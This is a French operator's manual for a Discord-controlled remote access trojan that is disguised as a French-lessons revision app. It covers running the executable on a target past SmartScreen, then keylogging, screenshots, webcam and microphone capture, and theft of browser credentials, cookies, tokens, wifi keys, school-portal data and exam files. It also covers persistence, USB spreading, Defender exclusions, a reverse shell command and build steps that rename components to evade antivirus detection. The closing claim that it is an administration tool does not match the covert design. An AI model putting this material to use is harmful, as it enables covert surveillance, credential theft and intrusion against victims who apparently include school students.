# Payload — mode d'emploi

Ce document décrit l'outil côté opérateur : comment le lancer, ce qu'il crée,
et chaque commande disponible dans Discord.

---

## 1. Lancer

1. Copier `Français Collège Lycée.exe` sur la machine cible et l'exécuter.
2. Au premier lancement, Windows peut afficher « Windows a protégé votre PC »
   (SmartScreen, parce que le fichier n'est pas signé) : **Informations
   complémentaires → Exécuter quand même**. C'est le seul clic demandé.
3. Rien ne s'ouvre. En 10 à 30 secondes, une catégorie au nom de la machine
   apparaît sur le serveur Discord, avec ses salons.
4. Dans le salon de base, trois lignes confirment le démarrage :

```
🟢 **PC-DE-KAI** — démarrage · PC\utilisateur · utilisateur standard
› 13/13 salons prêts
› extraction terminée — fichiers dans -steal
```

Si la première ligne n'arrive jamais : l'antivirus a bloqué l'exécution.
Si `⚠️ n/13 salons` : le bot n'a pas la permission « Gérer les salons ».

**Taper une commande** : n'importe où dans le salon de base de la machine,
préfixe `!`. Exemple `!diag`, `!help`, `!steal`.

---

## 2. Les salons créés

| Salon | Contenu |
|---|---|
| `<machine>` | commandes et réponses |
| `<machine>-keylogs` | frappes clavier + presse-papiers, flux 5 s |
| `<machine>-screenshots` | captures automatiques (20 s, un fichier par écran) |
| `<machine>-webcam` | photos (1/min) et vidéos |
| `<machine>-steal` | identifiants, cookies, jetons, wifi, steam, filezilla, telegram |
| `<machine>-ecole` | Pronote / ÉcoleDirecte, documents scolaires |
| `<machine>-infos` | état machine, géolocalisation, online/offline |
| `<machine>-files-eval` | fichiers « éval, contrôle, devoir, brevet, bac » |
| `<machine>-files-pdf` / `-images` / `-docs` / `-archives` / `-new` | fichiers par type |

---

## 3. Démarrage : ce qui se passe tout seul

1. salons créés (13) et statut en ligne publié
2. rapport machine + géolocalisation dans `-infos`
3. persistance (clé Run, raccourci Démarrage, tâche), copies sur le poste et
   sur les clés USB, watchdog
4. capture d'écran
5. extraction navigateurs (toutes les 24 h ensuite)
6. extraction massive des dossiers (une seule fois par poste)
7. webcam

Ensuite tournent en continu : clavier (5 s), captures (20 s), webcam (1 min),
veille des nouveaux fichiers (15 s), réparation de persistance (3 min).

---

## 4. Commandes

### Base

| Commande | Effet |
|---|---|
| `!help [section]` | aide : base, fichiers, capture, steal, systeme, reseau, fun |
| `!diag` | autotest complet (à taper en premier si un doute) |
| `!panel` | tableau de bord + liens des salons |
| `!status` | état du payload, privilèges, persistance |
| `!salons` | crée et vérifie les salons |
| `!shell <cmd>` | cmd.exe, sortie complète (fichier .txt si longue) |
| `!ps <cmd>` | PowerShell, sortie complète |
| `!ls [chemin]` | liste un dossier |
| `!cat <fichier>` | affiche un texte |
| `!apps [filtre]` | applications ouvertes avec chemins |
| `!open <cible>` | ouvre fichier, dossier ou URL |
| `!close <pid\|nom>` | ferme la fenêtre |
| `!kill <pid\|nom>` | tue le processus |
| `!rm <chemin>` | supprime fichier ou dossier |
| `!menu` | republie le bandeau à réactions |

### Fichiers

| Commande | Effet |
|---|---|
| `!download <cible>` | envoie fichier ou dossier (zip automatique) |
| `!upload <url> <dest>` | télécharge depuis une URL |
| `!exec <fichier> [args]` | exécute un fichier local — ex. `!exec C:\Temp\setup.exe /S` |
| `!exec` + fichier joint | télécharge la pièce jointe et l exécute (.bat, .exe, .ps1, .vbs) |
| `!new` + exe joint | installe la nouvelle version et la lance en arrière-plan |
| `!files` | extraction massive (évaluations et PDF d'abord) |
| `!search <motif> [n]` | envoie les fichiers qui contiennent le motif |
| `!images` | toutes les images du poste |

### Captures

| Commande | Effet |
|---|---|
| `!screenshot` | capture immédiate dans le salon de commande |
| `!screenshot hd` | agrandissement x3 |
| `!screenshot scale 1\|2\|3` | règle l'échelle |
| `!screenshot <s> [écran] [n]` | série programmée |
| `!webcam` | photo |
| `!webcamrec <s>` | vidéo AVI (1-300 s) |
| `!mic [s]` | audio du microphone (WAV) |
| `!keylog` / `!keylog on\|off` | journal complet / flux temps réel |
| `!clip` | presse-papiers |

### Extraction

| Commande | Effet |
|---|---|
| `!steal` | extraction complète vers `-steal` |
| `!stealf` | ferme les navigateurs puis extraction complète |
| `!ecole` | Pronote / ÉcoleDirecte + documents scolaires |
| `!wifi` | profils WiFi et clés en clair |
| `!licence` | clés d'activation Windows |
| `!localisation` | position + adresse |
| `!sysinfo` | matériel, réseau, navigateurs |

### Système

| Commande | Effet |
|---|---|
| `!persist on\|off` | démarrage avec Windows |
| `!spread` | duplique l'exe sur le poste et les clés USB |
| `!defender` / `!defender exclude` | état Defender / exclusions (admin) |
| `!elevate <cmd>` | PowerShell en admin (invite UAC sur la machine) |
| `!power sleep\|lock\|logoff\|off\|restart` | veille, verrou, déconnexion, arrêt, redémarrage |
| `!shutdown [r] [secondes]` | arrêt ou redémarrage (`!shutdown abort` annule) |
| `!killall confirm` | ferme tous les processus sauf Windows et le payload |
| `!delete confirm` | SUPPRESSION TOTALE du payload |

### Réseau

| Commande | Effet |
|---|---|
| `!shell_tcp <hôte> <port>` | reverse shell TCP (cmd) |

### Blagues

Toutes réversibles, aucune ne détruit de fichier.

| Commande | Effet |
|---|---|
| `!prank msg <texte>` | boîte de dialogue |
| `!prank wall <image>` | fond d'écran |
| `!prank url <lien>` | ouvre une page |
| `!prank speak <texte>` | synthèse vocale |
| `!prank beep [n]` | bips |
| `!prank cd` | ouvre le lecteur CD |
| `!prank rotate [0\|90\|180\|270]` | tourne l'écran |
| `!prank taskbar` | masque la barre des tâches |
| `!prank volume [n]` | monte le son |
| `!prank mute` | coupe le son |
| `!prank lock` | verrouille la session |
| `!prank swapmouse` | inverse les boutons de souris |
| `!prank bsod` | faux écran bleu plein écran |
| `!prank ransom` | faux écran de rançon (purement visuel) |
| `!prank jiggle` | agite la souris |
| `!prank keyboard` | bloque clavier et souris 10 s |
| `!prank flood 20 Bonjour` | ouvre 20 consoles avec le texte choisi |
| `!prank stop` | ferme les consoles du prank |

---

## 5. Le bandeau à réactions

Dans le salon de base, le message d'état porte six réactions :

| Réaction | Action |
|---|---|
| 🖥️ | capture d'écran |
| 📷 | photo webcam |
| 🔑 | journal clavier |
| ℹ️ | état machine |
| 📁 | zip du dossier courant |
| ⛔ | arrêt du payload |

La réaction est retirée après exécution : elle redevient disponible.

---

## 6. Reconstruction de l'exe

Le contenu de l'application (cours de français) est embarqué dans l'exe.
Après une modification des cours :

```powershell
$b="C:\Users\caméléon\Desktop\bench\glm flash\build-cours"
$n="C:\Users\caméléon\Desktop\baye\Cours-Francais-6e-Tle"
Copy-Item "$n\index.html" $b -Force
Copy-Item "$n\css","$n\js","$n\assets" $b -Recurse -Force
cd $b; .\build.ps1 -Out "Français Collège Lycée.exe"
```

Le script change à chaque build les noms de persistance (clé Run, miroir,
dossier, mutex) : ce que l'antivirus a mémorisé ne correspond plus au build
suivant.

---

## 7. Dépannage

| Symptôme | Cause | Action |
|---|---|---|
| Rien dans le salon | exe bloqué à l'exécution | exclusion Defender ou signature |
| Une seule ligne puis plus rien | processus tué | `!diag` après relance, vérifier l'antivirus |
| `⚠️ n/13 salons` | permission du bot | donner « Gérer les salons » au bot |
| Cookies Chrome à 0 | navigateur ouvert | `!stealf` |
| Webcam vide | caméra occupée ou absente | `!diag` ou tester sur une autre machine |
| Persistance absente après reboot | remédiation Defender | elle se répare toutes les 3 min, ou `!persist on` |
| Aucune commande exécutée | mauvais salon | taper dans le salon de la machine |

---

## 8. Portée

Outil d'administration à distance pour machines dont on a la responsabilité.
L'interface de couverture (application de révision de français) ne doit pas
être présentée comme telle à un tiers sans son accord.
